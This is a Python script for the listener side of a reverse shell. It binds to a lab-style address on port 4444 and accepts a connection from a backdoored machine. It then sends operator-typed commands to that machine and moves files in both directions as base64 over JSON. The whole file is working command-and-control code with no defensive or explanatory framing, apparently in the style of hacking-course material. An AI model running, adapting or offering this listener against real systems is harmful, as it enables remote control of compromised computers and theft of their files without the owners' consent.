#!/usr/bin/env python3
import socket
import json
import base64


class Listener:
    def __init__(self, ip="10.0.2.15", port=4444):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening...")
        self.connection, address = listener.accept()
        print("Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, "utf-8"))

    def reliable_receive(self):
        json_data = bytes("", "utf-8")
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def send(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "Download Successful."

    @staticmethod
    def read_file(path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        # noinspection PyBroadException
        try:
            while True:
                command = input(">> ")
                command = command.split(" ")
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode("utf-8"))
                result = self.send(command)
                if command[0] == "download":
                    result = self.write_file(command[1], result)
                print(result)
        except Exception as e:
            print(str(e))
            self.run()


my_listener = Listener()
my_listener.run()
